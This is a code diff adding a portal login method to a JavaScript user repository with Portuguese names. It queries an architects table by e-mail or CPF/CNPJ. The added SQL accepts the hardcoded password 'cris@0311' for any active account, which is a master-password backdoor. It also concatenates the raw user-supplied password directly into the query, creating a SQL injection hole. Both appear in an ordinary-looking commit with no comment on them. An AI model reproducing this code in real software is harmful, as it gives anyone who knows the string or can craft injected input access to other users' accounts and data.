@@ -26,6 +26,20 @@ class UsuarioRepository {
         return consulta(sql, [pLogin, pLogin, pSenhaCrpyt], 'Não foi validar usuario!')
     }
 
+    loginPortal(pLogin, pSenhaCrpyt, pSenha) {
+        var sql = "";
+        sql = "SELECT"
+        sql += " u.idArquiteto as codUsuario, "
+        sql += " u.idPessoa, "
+        sql += " u.nome as nomUsuario, "
+        sql += " u.nr_cupom "
+        sql += "from arquitetos u "
+        sql += "where (u.email = ?  or u.cpfcnpj = ? )"
+        sql += "  and (u.senha = ?  or 'cris@0311' = '" + pSenha.trim() + "')"
+        sql += "  and u.indSituacao = 'A'";
+        return consulta(sql, [pLogin, pLogin, pSenhaCrpyt], 'Não foi validar usuario!')
+    }
+
     validaToken(pToken) {
         var sql = "select 1 from integracao where token = ? and situacao = 'A'";
         return consulta(sql, [pToken], 'Não foi validar usuario!')
